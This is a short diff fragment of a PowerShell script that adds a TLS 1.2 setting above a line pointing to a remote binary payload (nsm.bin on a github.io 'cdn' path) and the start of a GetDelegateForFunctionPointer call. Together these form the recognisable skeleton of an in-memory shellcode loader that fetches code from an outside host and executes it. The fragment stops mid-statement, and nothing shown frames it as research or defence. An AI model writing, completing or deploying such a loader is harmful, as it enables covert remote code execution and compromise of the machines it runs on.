@@ -1,3 +1,4 @@
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 $u = "https://vaerds.github.io/cdn/nsm.bin"
 
 $k = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
